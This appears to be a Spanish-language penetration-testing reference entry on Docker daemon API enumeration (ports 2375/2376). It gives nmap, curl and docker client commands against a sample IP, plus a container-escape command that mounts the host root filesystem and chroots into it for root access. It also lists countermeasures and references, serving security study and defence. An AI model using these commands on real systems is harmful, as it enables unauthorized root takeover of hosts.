# Enumeración Docker (Puerto 2375/2376)

## Descripción
Docker es una plataforma de contenedores líder. Cuando el Docker Daemon (dockerd) se configura para aceptar conexiones remotas (por defecto en el puerto 2375 para HTTP y 2376 para HTTPS), se convierte en un vector crítico si no está protegido con TLS. La enumeración de Docker se enfoca en verificar si la API está expuesta sin autenticación, lo que permitiría a un atacante listar contenedores, imágenes, volúmenes e incluso ejecutar comandos con privilegios de root en el host (Privilege Escalation).

## Clasificación
- **Fase**: Enumeración, Explotación
- **MITRE ATT&CK**: 
    - T1046 (Network Service Discovery)
    - T1613 (Container Administration Command)
- **Plataforma**: Multi
- **Dificultad**: Intermedia

## Herramientas
- **docker** — cliente oficial (utilizando el flag -H para conectarse remotamente)
- **curl** — para interactuar directamente con los endpoints de la API REST
- **nmap** — scripts NSE (docker-version, docker-info)
- **Metasploit** — módulos auxiliares para escaneo y ejecución de contenedores

## Comandos / Ejemplos

### Escaneo con Nmap
```bash
# Identificar si la API de Docker está expuesta y obtener información del sistema
nmap -p 2375,2376 -sV --script docker-version,docker-info 10.10.10.10
```

### Enumeración Manual con Curl (API REST)
```bash
# Obtener información básica del sistema
curl -s http://10.10.10.10:2375/info | jq .

# Listar todos los contenedores (activos e inactivos)
curl -s http://10.10.10.10:2375/containers/json?all=1 | jq .

# Listar imágenes disponibles localmente
curl -s http://10.10.10.10:2375/images/json | jq .

# Listar volúmenes creados
curl -s http://10.10.10.10:2375/volumes | jq .
```

### Enumeración con el cliente Docker
```bash
# Listar contenedores remotos
docker -H tcp://10.10.10.10:2375 ps -a

# Inspeccionar un contenedor específico (revelar variables de entorno, redes, etc.)
docker -H tcp://10.10.10.10:2375 inspect <container_id>
```

### Explotación (RCE y Escape de Contenedor)
Si se tiene acceso a la API expuesta, se puede ejecutar un contenedor que monte la raíz del sistema de archivos del host:
```bash
# Ejecutar un contenedor de Alpine montando la raíz del host en /mnt/host
docker -H tcp://10.10.10.10:2375 run -it -v /:/mnt/host alpine:latest chroot /mnt/host
```

## Contramedidas
- **Deshabilitar la API remota** si no es estrictamente necesaria. Preferir el uso de SSH para la gestión remota.
- **Implementar TLS con certificados** mutuos si la API remota es requerida (puerto 2376).
- **Utilizar firewalls** para permitir el acceso al puerto 2375/2376 únicamente desde IPs de gestión autorizadas.
- **Evitar ejecutar Docker como root** (utilizar Rootless mode si es posible).
- **Monitorear los logs de auditoría** de Docker para detectar actividades inusuales de creación o ejecución de contenedores.

## Referencias
- Docker Documentation. (2024). Protect the Docker daemon socket. https://docs.docker.com/engine/security/protect-access/
- HackTricks. (2024). 2375, 2376 - Pentesting Docker. https://book.hacktricks.xyz/network-services-pentesting/pentesting-docker
- CIS Docker Benchmark. (2024). Center for Internet Security. https://www.cisecurity.org/benchmark/docker
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
